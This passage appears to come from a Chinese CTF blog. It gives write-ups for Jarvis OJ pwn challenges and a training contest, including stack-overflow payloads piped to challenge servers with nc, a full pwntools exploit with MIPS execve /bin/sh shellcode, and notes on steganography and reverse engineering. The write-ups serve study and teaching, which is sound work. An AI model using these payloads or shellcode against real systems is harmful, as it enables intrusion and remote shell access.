class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = fgetc(v0);</span><br><span class="line">    buf = result;</span><br><span class="line">    <span class="keyword">if</span> ( (_BYTE)result == <span class="number">-1</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    write(<span class="number">1</span>, &amp;buf, <span class="number">1u</span>LL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现一个good_game函数可以读取flag并输出</p><pre><code>.text:0000000000400620                 public good_game.text:0000000000400620 good_game       proc near.text:0000000000400620.text:0000000000400620 buf             = byte ptr -9.text:0000000000400620.text:0000000000400620 ; __unwind {.text:0000000000400620                 push    rbx.text:0000000000400621                 mov     esi, offset modes ; &quot;r&quot;.text:0000000000400626                 mov     edi, offset filename ; &quot;flag.txt&quot;</code></pre><p>地址是0x00400620, 即覆盖返回地址为0x00400620即可, 注意按照小端序, 64位程序补齐高4字节地址</p><p>payload:<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -c 'print "A" * 0x88 + "\x20\x06\x40\x00\x00\x00\x00\x00"' | nc pwn.jarvisoj.com 9876</span><br></pre></td></tr></table></figure></p><h2 id="0x02-Smashes-Point-200"><a href="#0x02-Smashes-Point-200" class="headerlink" title="0x02 Smashes Point:200"></a>0x02 Smashes Point:200</h2><pre><code>Arch:     amd64-64-littleRELRO:    No RELROStack:    Canary foundNX:       NX enabledPIE:      No PIE (0x400000)FORTIFY:  Enabled</code></pre><p>开了Canary, 会检测标志位以防止栈溢出, 可以看到如果发生了栈溢出会输出:</p><p><img src="/2019/01/24/jarvis-oj-pwn-做题记录/3.png" alt="img"></p><p>在ida点菜单中的View-&gt;Open subviews-&gt;String可以打开字符串窗口, 看到</p><p><img src="/2019/01/24/jarvis-oj-pwn-做题记录/1.png" alt="img"></p><p>即flag是读到内存中了的</p><p>那么我们可以把flag的地址覆盖到argv[0]=/home/username/filename, 就可以输出flag</p><p>这个漏洞点也很明显:<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">sub_4007E0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+0h] [rbp-128h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+108h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  __printf_chk(<span class="number">1L</span>L, <span class="string">"Hello!\nWhat's your name? "</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !_IO_gets(&amp;v3) )</span><br><span class="line">LABEL_9:</span><br><span class="line">    _exit(<span class="number">1</span>);</span><br><span class="line">  v0 = <span class="number">0L</span>L;</span><br><span class="line">  __printf_chk(<span class="number">1L</span>L, <span class="string">"Nice to meet you, %s.\nPlease overwrite the flag: "</span>);</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>read函数读取了0x28个数据, 但是在</p><pre><code>.text:00000000004007E0 sub_4007E0      proc near               ; CODE XREF: main+12↑p.text:00000000004007E0.text:00000000004007E0 var_20          = qword ptr -20h.text:00000000004007E0.text:00000000004007E0                 push    rbp.text:00000000004007E1                 mov     esi, offset aHelloWhatSYour ; &quot;Hello!\nWhat&apos;s your name? &quot;.text:00000000004007E6                 mov     edi, 1</code></pre><p>可以看到只有0x20的栈, 存在栈溢出</p><p>那么我们只要一直填充数据到地址覆盖到argv[0]即可</p><p>让程序输入一些数据看一下输入开始的地址:</p><p><img src="/2019/01/24/jarvis-oj-pwn-做题记录/2.png" alt="img"></p><p>栈从低地址向高地址增加, argv[0]在高地址, main函数的栈在低地址, 然后main函数的栈帧中, 地址由低向高增加, 所以大量数据填充可以让我们的输入覆盖到高地址的argv[0]</p><p><img src="/2019/01/24/jarvis-oj-pwn-做题记录/4.png" alt="img"></p><p>搜索一下flag的位置</p><pre><code>pwndbg&gt; search CTF{smashes         0x400d21 push   r12 /* &quot;CTF{Here&apos;s the flag on server}&quot; */smashes         0x600d21 &quot;CTF{Here&apos;s the flag on server}</code></pre><p>还有argv[0]的位置</p><pre><code>pwndbg&gt; search /home/a/smasheswarning: Unable to access 16000 bytes of target memory at 0x7ffff7bd2d0e, halting search.[stack]         0x7fffffffe230 &apos;/home/a/smashes&apos;[stack]         0x7fffffffe800 &apos;/home/a/smashes&apos;[stack]         0x7fffffffefe8 &apos;/home/a/smashes&apos;</code></pre><p>输入数据保存的位置(栈顶)</p><pre><code>RSP  0x7fffffffe3b0 ◂— 0x34333231 /* &apos;1234&apos; */</code></pre><p>我们选取一个距离最远的,保证覆盖到argv[0]</p><p>按8字节小端序对齐</p><p>所以最终payload为:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">python -c <span class="string">"print((0x7fffffffefe8 - 0x7fffffffe3b0) / 8 * '\x21\x0d\x40\x00\x00\x00\x00\x00' + '\n\n')"</span> | nc pwn.jarvisoj.com <span class="number">9877</span></span><br></pre></td></tr></table></figure><p>记录一下格式化字符串:</p><p>格式化占位符（format placeholder），语法是：</p><pre><code>%[parameter][flags][field width][.precision][length]type</code></pre><ul><li>parameter: n$, n用来指示是第几个参数, 如: <code>printf(&quot;%2$d, %1$d&quot;, 1, 2)</code> 输出的是<code>2, 1</code></li><li>flags: <ul><li>+: 正号, 表示有符号数值, 仅用于数值类型</li><li>空格: 输出有符号数的时候如果没有正负号或者零个字符, 就前缀一个空格, 与<code>+</code>同时出现的时候忽略</li><li>-: 左对齐, 默认情况下是右对齐</li><li>#: 不删除尾部0保持精度, 总输出小数点, 输出0, 0x, 0X表示进制</li></ul></li><li>field width: 给出显示数值的最小宽度, 不足时补齐, 超出时全部输出</li><li>.precision: 指明输出的最大长度</li><li>length: 指明参数长度, hh, 输出一个字节, h, 输出一个双字节</li><li>type: <ul><li>d/i: 有符号整数, 如果scanf的时候, 输入16进制数如<code>0x2f</code>, 则应用i, 否则d和i同义</li><li>u: 无符号整数</li><li>f/F: double型按10进制定点表示, 如2.2323</li><li>e/E: 按科学计数法表示, 1.5e002</li><li>g/G: double, 输出全部有效数字位</li><li>x/X: 16 进制 unsigned int</li><li>o/8: 进制 unsigned int</li><li>s: 如果没有用 l 标志, 输出 null 结尾字符串直到精度规定的上限; 如果没有指定精度，则输出所有字节. 如果用了 l 标志, 则对应函数参数指向 wchar_t 型的数组，输出时把每个宽字符转化为多字节字符, 相当于调用 wcrtomb 函数.</li></ul></li></ul><p><code>0000000000600D21</code> <code>\x21\x0d\x60\x00\x00\x00\x00\x00</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>训练赛记录</title>
      <link href="/2019/01/19/%E8%AE%AD%E7%BB%83%E8%B5%9B%E8%AE%B0%E5%BD%95/"/>
      <url>/2019/01/19/%E8%AE%AD%E7%BB%83%E8%B5%9B%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这周做了UCAS的内部赛, 调出来pwn的时候才知道比赛时间只有11小时orz, 大佬们做的最多的是re1, 然而我ida打开以后看到一堆函数就不想看了233, 最终只提交了一个签到题, orz我好菜</p><h1 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h1><p>文件: <a href="https://github.com/Inv0k3r/pwnable_files/raw/master/checkin.png">checkin.png</a></p><p>LSB低位隐写，提取出来</p><p><code>XcHVycGxle2V6X2NoMVRWWX3JNZPWKN3GHBRDCOJYGQ3TMZDD303032653732333338636361313061626437387D</code></p><p>后半段 <code>303032653732333338636361313061626437387D</code> 看起来是16进制串，解出来 <code>002e72338cca10abd78}</code></p><p>中段 <code>MVRWWX3JNZPWKN3GHBRDCOJYGQ3TMZDD</code> 是base32： <code>eck_in_e7f8b198476dc</code></p><p>首段看起来是base64，解不出来，猜测是 <code>purple{ch</code></p><p>用base64以后是 <code>cHVycGxle2No</code></p><p>跟 <code>XcHVycGxle2V6X2No</code> 比较，看起来多了个X</p><p>解出来 <code>purple{ez_ch</code></p><p>结果：<code>purple{ez_check_in_e7f8b198476dc002e72338cca10abd78}</code></p><h1 id="PWN1"><a href="#PWN1" class="headerlink" title="PWN1"></a>PWN1</h1><p>文件在这里下载: <a href="https://github.com/Inv0k3r/pwnable_files/raw/master/bin.233">bin.233</a></p><p>题目给了一个binfile， checksec</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     mips-32-big</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>fine…mips环境搞起来</p><h2 id="0x01-QEMU-MIPS调试环境搭建"><a href="#0x01-QEMU-MIPS调试环境搭建" class="headerlink" title="0x01 QEMU MIPS调试环境搭建"></a>0x01 QEMU MIPS调试环境搭建</h2><p>下载虚拟机和内核文件 <code>https://people.debian.org/~aurel32/qemu/mips/</code></p><p>这里下载 <code>debian_wheezy_mips_standard.qcow2</code> 和 <code>vmlinux-3.2.0-4-4kc-malta</code></p><p>我宿主机是Vmware的Ubuntu 16.04, 在里面开qemu虚拟机, 采用网桥的方式建立MIPS虚拟机和Ubuntu的连接</p><p>安装QEMU: </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install -y qemu qemu-user-static qemu-system</span><br></pre></td></tr></table></figure><p>下载虚拟机和内核文件</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget https://people.debian.org/~aurel32/qemu/mips/debian_wheezy_mips_standard.qcow2 &amp;&amp;</span><br><span class="line">wget https://people.debian.org/~aurel32/qemu/mips/vmlinux-3.2.0-4-4kc-malta</span><br></pre></td></tr></table></figure><p>然后，虚拟机，启动！</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo qemu-system-mips \</span><br><span class="line">    -M malta \</span><br><span class="line">    -kernel vmlinux-3.2.0-4-4kc-malta \</span><br><span class="line">    -hda debian_wheezy_mips_standard.qcow2 \</span><br><span class="line">    -append &quot;root=/dev/sda1 console=tty0&quot; \</span><br><span class="line">    -netdev user,id=net0 \</span><br><span class="line">    -device e1000,netdev=net0,id=net0,mac=52:54:00:c9:18:27 \</span><br><span class="line">    -net user -redir tcp:2222::2222 \</span><br><span class="line">    -gdb tcp::22333 \</span><br><span class="line">    -redir tcp:1234::1234 \</span><br><span class="line">    -nographic</span><br></pre></td></tr></table></figure><p>账号密码都是root, 然后添加了端口映射, 便于在Ubuntu里调试</p><p>给Ubuntu安装pwndbg和调试MIPS的插件：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/pwndbg/pwndbg &amp;&amp;</span><br><span class="line">cd pwndbg &amp;&amp;</span><br><span class="line">sudo bash setup.sh &amp;&amp;</span><br><span class="line">sudo apt install gdb-multiarch</span><br></pre></td></tr></table></figure></p><p>关于调试:</p><p>我在qemu虚拟机里装了gdb和socat, 即:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install gdb socat</span><br></pre></td></tr></table></figure><p>然后把要调试的文件传到了免费网盘github, 之后通过wget下载到qemu虚拟机中</p><p>然后用socat启动gdb调试, 这里的1234端口是上面启动虚拟机的时候设置的端口映射</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">socat TCP-LISTEN:1234,reuseaddr,fork EXEC:&quot;gdb bin.233&quot;</span><br></pre></td></tr></table></figure><p>这样我们在Ubuntu机里就可以用 <code>nc 127.0.0.1 1234</code> 进行连接</p><p>输入payload可以用python脚本配合pwntools</p><p>如:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">r = remote(&apos;127.0.0.1&apos;, 1234)</span><br></pre></td></tr></table></figure></p><p>后面的操作就相当于开了一个远程调试的gdb, 直接用pwntools发送指令即可, 比如查看栈内存:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">r.sendline(&apos;x/100wx $sp&apos;)</span><br></pre></td></tr></table></figure><p>蛋疼的是mips虚拟机里没法装pwndbg之类的工具, 只能用原始的gdb来调, 不过足够了</p><h2 id="0x02-反编译代码分析"><a href="#0x02-反编译代码分析" class="headerlink" title="0x02 反编译代码分析"></a>0x02 反编译代码分析</h2><p>我用的是jeb的mips反编译的, 可以试用一个月, 开个虚拟机到期就重置2333</p><p>main函数:<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> param0, <span class="keyword">unsigned</span> <span class="keyword">int</span> param1)</span> </span>&#123;</span><br><span class="line">    setvbuf(*gvar_411214, <span class="number">6</span>, <span class="number">2</span>, <span class="number">6</span>);</span><br><span class="line">    setvbuf(**&amp;gvar_411208, <span class="number">6</span>, <span class="number">2</span>, <span class="number">6</span>);</span><br><span class="line">    param0 = *&amp;gvar_4111D4 + <span class="number">4448</span>;</span><br><span class="line">    <span class="keyword">char</span> *v0 = getenv(<span class="string">"PWD"</span>);</span><br><span class="line">    *&amp;ROOT = v0;</span><br><span class="line">    menu(param0, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; ++i) &#123;</span><br><span class="line">        respond(param0, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>menu函数:<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">menu</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> param0, <span class="keyword">unsigned</span> <span class="keyword">int</span> param1, <span class="keyword">unsigned</span> <span class="keyword">int</span> param2, <span class="keyword">unsigned</span> <span class="keyword">int</span> param3)</span> </span>&#123;</span><br><span class="line">    system(<span class="string">"pwd"</span>, param1, param2, param3);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"start?"</span>);</span><br><span class="line">    <span class="keyword">return</span> read(<span class="number">0</span>, *&amp;gvar_4111D8, <span class="number">1</span>, param3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>respond函数:<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">respond</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> param0, <span class="keyword">unsigned</span> <span class="keyword">int</span> param1, <span class="keyword">unsigned</span> <span class="keyword">int</span> param2, <span class="keyword">unsigned</span> <span class="keyword">int</span> param3)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(gvar_4111D8, <span class="number">0</span>, <span class="number">4096</span>, param3);</span><br><span class="line">    <span class="keyword">int</span> result = read(<span class="number">0</span>, mesg, <span class="number">4096</span>, param3);</span><br><span class="line">    <span class="keyword">int</span> v0 = result;</span><br><span class="line">    <span class="keyword">if</span>(result == <span class="number">0</span>) &#123;</span><br><span class="line">        result = fwrite(<span class="string">"Client disconnected upexpectedly.\n"</span>, <span class="number">1</span>, <span class="number">34</span>, **&amp;gvar_41123C);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(result &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        result = fwrite(<span class="string">"recv() error\n"</span>, <span class="number">1</span>, <span class="number">13</span>, **&amp;gvar_41123C);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123; <span class="comment">// len(result) &gt; 0, 有输入</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s"</span>, mesg, <span class="number">4096</span>, param3);</span><br><span class="line">        result = strtok(mesg, <span class="string">" \t\n"</span>, <span class="number">4096</span>, param3); <span class="comment">// 用" \t\n"切割字符串</span></span><br><span class="line">        result = <span class="built_in">strncmp</span>(result, <span class="string">"GET"</span>, <span class="number">4</span>, param3); <span class="comment">// 比较前4个字符</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(result == <span class="number">0</span>) &#123;</span><br><span class="line">            result = strtok(mesg, <span class="string">" \t"</span>, <span class="number">4</span>, param3); <span class="comment">// 用" \t"切割字符串</span></span><br><span class="line">            <span class="keyword">char</span> *filename = result;</span><br><span class="line">            result = strtok(mesg, <span class="string">" \t\n"</span>, <span class="number">4</span>, param3); <span class="comment">// 用" \t\n"切割字符串</span></span><br><span class="line">            <span class="keyword">char</span> *protocol = result;</span><br><span class="line">            result = <span class="built_in">strncmp</span>(protocol, <span class="string">"HTTP/1.0"</span>, <span class="number">8</span>, param3); <span class="comment">// 比较前8个字符</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(result != <span class="number">0</span>) &#123;</span><br><span class="line">                result = <span class="built_in">strncmp</span>(protocol, <span class="string">"HTTP/1.1"</span>, <span class="number">8</span>, param3); <span class="comment">//比较</span></span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(result != <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> write(<span class="number">1</span>, <span class="string">"HTTP/1.0 400 Bad Request\n"</span>, <span class="number">25</span>, param3);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            result = <span class="built_in">strncmp</span>(filename, <span class="string">"/"</span>, <span class="number">2</span>, param3);</span><br><span class="line">            <span class="keyword">if</span>(result == <span class="number">0</span>) &#123;</span><br><span class="line">                filename = <span class="string">"/index.html"</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            env_str = *&amp;ROOT;</span><br><span class="line">            <span class="built_in">strcpy</span>(&amp;path, env_str); <span class="comment">// path = /home/fish</span></span><br><span class="line">            result = <span class="built_in">strlen</span>(*&amp;R00T, env_str, <span class="number">2</span>, param3); <span class="comment">// 路径的长度</span></span><br><span class="line">            <span class="comment">// 字符串拼接 path = /home/fish + v1,</span></span><br><span class="line">            <span class="comment">// 没有计算文件名的长度就直接copy了, 可以导致栈溢出</span></span><br><span class="line">            <span class="built_in">strcpy</span>(((<span class="keyword">unsigned</span> <span class="keyword">int</span>)(result + ((<span class="keyword">int</span>)(&amp;path)))), filename, <span class="number">2</span>, param3); </span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"file: %s\n"</span>, &amp;path, <span class="number">2</span>, param3); <span class="comment">// 输出path</span></span><br><span class="line">            result = open(&amp;path, <span class="number">0</span>, <span class="number">2</span>, param3); <span class="comment">// 打开path指向的文件</span></span><br><span class="line">            <span class="comment">// 文件存在则输出200 OK, 否则404</span></span><br><span class="line">            result = result != <span class="number">-1</span> ? write(l, <span class="string">"HTTP/1.0 200 0K\n\n"</span>, <span class="number">17</span>, param3): write(<span class="number">1</span>, <span class="string">"HTTP/1.0 404 Not Found\n"</span>, <span class="number">23</span>, param3);    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h1 id="0x03-分析"><a href="#0x03-分析" class="headerlink" title="0x03 分析"></a>0x03 分析</h1><p>输入的HTTP请求段mesg:</p><p>GET /{file} HTTP/1.0</p><p><img src="/2019/01/19/训练赛记录/1.png" alt="img"></p><p>可以看到栈里的数据, strcpy复制的时候没检查长度造成栈溢出, 测得保存的文件路径在$sp + 0x2c处(本机测试的时候路径是/root)</p><p><img src="/2019/01/19/训练赛记录/2.png" alt="img"></p><p>$ra(返回地址寄存器)保存在$sp + 0x134处</p><p><img src="/2019/01/19/训练赛记录/3.png" alt="img"><br><img src="/2019/01/19/训练赛记录/4.png" alt="img"></p><p>/bin/sh也有了, system也有了</p><p><img src="/2019/01/19/训练赛记录/5.png" alt="img"></p><p><img src="/2019/01/19/训练赛记录/6.png" alt="img"></p><p>看起来是要构造ROP, 但是有一个问题是, payload里不能有\x00不然会截断</p><p>但是所有地址都是0x0040开头的, 所以没法构造ROP</p><p>本来跳转到 0x00400e68, 现在跳转到 0x7fff6b5a, a(1000b) 最低两个有效位有一个不是0</p><p>尝试把shellcode写到栈上然后控制$ra跳转过去</p><p>在Exploit-DB上找了个mips 32 big endian的shellcode</p><pre><code>shellcode  = &quot;\x28\x06\xff\xff&quot;      #  /* slti    a2,zero,-1   */shellcode += &quot;\x3c\x0f\x2f\x2f&quot;      #  /* lui     t7,0x2f2f    */shellcode += &quot;\x35\xef\x62\x69&quot;      #  /* ori     t7,t7,0x6269 */shellcode += &quot;\xaf\xaf\xff\xf4&quot;      #  /* sw      t7,-12(sp)   */shellcode += &quot;\x3c\x0e\x6e\x2f&quot;      #  /* lui     t6,0x6e2f    */shellcode += &quot;\x35\xce\x73\x68&quot;      #  /* ori     t6,t6,0x7368 */shellcode += &quot;\xaf\xae\xff\xf8&quot;      #  /* sw      t6,-8(sp)    */shellcode += &quot;\xaf\xa0\xff\xfc&quot;      #  /* sw      zero,-4(sp)  */shellcode += &quot;\x27\xa4\xff\xf4&quot;      #  /* addiu   a0,sp,-12    */shellcode += &quot;\x28\x05\xff\xff&quot;      #  /* slti    a1,zero,-1   */shellcode += &quot;\x24\x02\x0f\xab&quot;      #  /* li      v0,4011      */shellcode += &quot;\x01\x01\x01\x0c&quot;      #  /* syscall 0x40404      */</code></pre><p>看一下函数返回的操作</p><pre><code>  break         $sp        $ra          code0x00400CC0  0x7fff6bd8  0x00400c9c  jalr    $t9 ; strcpy                # 这条指令将执行strcpy0x00400CC4  0x7fff6bd8  0x00400cc8  nop0x00400CC8  0x7fff6bd8  0x00400cc8  lw      $gp, 0x138+var_128($fp)     # strcpy后第一条指令----------0x00400D7C  0x7fff6bd8  0x00400d70  lw      $ra, 0x138+var_4($sp)       # 这里修改了$ra, 我们溢出到栈上覆盖了这个地址后, $ra的值是我们伪造的地址0x00400D80  0x7fff6bd8  0x00400e68  lw      $fp, 0x138+var_8($sp)       # 这里伪造的$ra=0x7fff6b5a0x00400D84  0x7fff6bd8  0x00400e68  addiu   $sp, 0x138                  # $ra=0x7fff6b5a0x00400D88  0x7fff6d10  0x00400e68  jr      $ra                         # 跳转回main</code></pre><p>直接修改$ra 跳过去就可以, 修改$ra为0x7fff6b5a</p><p>测试完以后发现, 会报</p><pre><code>Program received signal SIGBUS, Bus error.GDB is unable to find the start of the function at 0x7fff6b5aand thus can&apos;t determine the size of that function&apos;s stack frame.This means that GDB may be unable to access that stack frame, orthe frames below it.This problem is most likely caused by an invalid program counter orstack pointer.However, if you think GDB should simply search farther backfrom 0x7fff6b5a for code which looks like the beginning of afunction, you can increase the range of the search using the `setheuristic-fence-post&apos; command.0x7fff6b5a in ?? ()</code></pre><p>猜测可能是MIPS需要对齐地址, $sp = 0x7fff6bd8, 所以应该按4字节增长, 设置$ra = $sp + 4 * n</p><p>但是实际运行环境的$sp不知道, 得想办法解决一哈</p><p>调试环境测试跳转到shellcode可以稳定getshell</p><p><img src="/2019/01/19/训练赛记录/7.png" alt="img"></p><p>0x04 exp</p><p>先给出exp…等我想办法找到栈地址再补充</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">shellcode  = <span class="string">"\x28\x06\xff\xff"</span>      <span class="comment">#  /* slti    a2,zero,-1   */</span></span><br><span class="line">shellcode += <span class="string">"\x3c\x0f\x2f\x2f"</span>      <span class="comment">#  /* lui     t7,0x2f2f    */</span></span><br><span class="line">shellcode += <span class="string">"\x35\xef\x62\x69"</span>      <span class="comment">#  /* ori     t7,t7,0x6269 */</span></span><br><span class="line">shellcode += <span class="string">"\xaf\xaf\xff\xf4"</span>      <span class="comment">#  /* sw      t7,-12(sp)   */</span></span><br><span class="line">shellcode += <span class="string">"\x3c\x0e\x6e\x2f"</span>      <span class="comment">#  /* lui     t6,0x6e2f    */</span></span><br><span class="line">shellcode += <span class="string">"\x35\xce\x73\x68"</span>      <span class="comment">#  /* ori     t6,t6,0x7368 */</span></span><br><span class="line">shellcode += <span class="string">"\xaf\xae\xff\xf8"</span>      <span class="comment">#  /* sw      t6,-8(sp)    */</span></span><br><span class="line">shellcode += <span class="string">"\xaf\xa0\xff\xfc"</span>      <span class="comment">#  /* sw      zero,-4(sp)  */</span></span><br><span class="line">shellcode += <span class="string">"\x27\xa4\xff\xf4"</span>      <span class="comment">#  /* addiu   a0,sp,-12    */</span></span><br><span class="line">shellcode += <span class="string">"\x28\x05\xff\xff"</span>      <span class="comment">#  /* slti    a1,zero,-1   */</span></span><br><span class="line">shellcode += <span class="string">"\x24\x02\x0f\xab"</span>      <span class="comment">#  /* li      v0,4011      */</span></span><br><span class="line">shellcode += <span class="string">"\x01\x01\x01\x0c"</span>      <span class="comment">#  /* syscall 0x40404      */</span></span><br><span class="line"></span><br><span class="line">shellcode_addr = <span class="string">''</span></span><br><span class="line">shellcode_addr = <span class="string">"\x7f\xff\x6b\x50"</span>  <span class="comment">#  shellcode的地址</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'/a'</span> + shellcode + <span class="string">'a'</span> * (<span class="number">253</span> - len(shellcode) - <span class="number">5</span>) + <span class="string">'/123'</span> + shellcode_addr</span><br><span class="line"></span><br><span class="line">http = <span class="string">'GET '</span> + payload + <span class="string">' HTTP/1.1'</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'127.0.0.1'</span>, <span class="number">1234</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">'r'</span>) <span class="comment"># gdb run</span></span><br><span class="line">r.recv()        <span class="comment"># start?</span></span><br><span class="line">r.send(<span class="string">'\n'</span>)</span><br><span class="line">r.sendline(http)</span><br><span class="line">r.recv()</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>题目本身简单..保护全关, 但是麻烦的地方就是调试环境, 一开始用qemu共享库起, 报段错误, 无法运行</p><p>m4x师傅给了我一个docker: <a href="https://github.com/Inv0k3r/multiarch-docker">multiarch-docker</a></p><p>能运行了但是一调试就炸…最后没办法了才直接在虚拟机里跑, 装个gdb然后端口映射233</p><h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><p>程序很简单, 对输入的64字节进行计算然后输出结果</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  const char *v3; // rdi</span><br><span class="line">  __int128 v5; // [rsp+0h] [rbp-48h]</span><br><span class="line">  __int128 v6; // [rsp+10h] [rbp-38h]</span><br><span class="line">  __int128 v7; // [rsp+20h] [rbp-28h]</span><br><span class="line">  __int128 v8; // [rsp+30h] [rbp-18h]</span><br><span class="line"></span><br><span class="line">  v5 = 0LL;</span><br><span class="line">  v6 = 0LL;</span><br><span class="line">  v7 = 0LL;</span><br><span class="line">  v8 = 0LL;</span><br><span class="line">  fgets((char *)&amp;v5, 64, stdin);</span><br><span class="line">  v3 = &quot;Correct&quot;;</span><br><span class="line">  if ( 3115122397540209627LL * (_QWORD)v5 != -8945977187951441533LL</span><br><span class="line">    &amp;&amp; 4414703129018815665LL * *((_QWORD *)&amp;v5 + 1) != 4916877443135797676LL</span><br><span class="line">    &amp;&amp; -3600163150705005919LL * (_QWORD)v6 != 7810089588917861348LL</span><br><span class="line">    &amp;&amp; 2848986016212807631LL * *((_QWORD *)&amp;v6 + 1) != 167648691539577515LL</span><br><span class="line">    &amp;&amp; -1642960843930225163LL * (_QWORD)v7 != 7205007458378757539LL</span><br><span class="line">    &amp;&amp; -1825322870425963839LL * *((_QWORD *)&amp;v7 + 1) != -4377928447117523719LL</span><br><span class="line">    &amp;&amp; 2026288208431064569LL * (_QWORD)v8 != 1464929445109676135LL</span><br><span class="line">    &amp;&amp; 7391496157776266721LL * *((_QWORD *)&amp;v8 + 1) != -2449767388115536590LL )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = &quot;Wrong&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  puts(v3);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>v5-8都是int128类型, 占用128 / 8 = 16字节, qword是8个字节</p><p>4个变量共64字节构成key, 然后每个变量又分别分成8个字节去计算</p><pre><code>3115122397540209627LL * (_QWORD)v5 != -8945977187951441533LL4414703129018815665LL * *((_QWORD *)&amp;v5 + 1) != 4916877443135797676LL-3600163150705005919LL * (_QWORD)v6 != 7810089588917861348LL2848986016212807631LL * *((_QWORD *)&amp;v6 + 1) != 167648691539577515LL-1642960843930225163LL * (_QWORD)v7 != 7205007458378757539LL-1825322870425963839LL * *((_QWORD *)&amp;v7 + 1) != -4377928447117523719LL2026288208431064569LL * (_QWORD)v8 != 1464929445109676135LL7391496157776266721LL * *((_QWORD *)&amp;v8 + 1) != -2449767388115536590LL</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> ctf </tag>
            
            <tag> mips </tag>
            
        </tags>
      
    </entry>
    
    
    
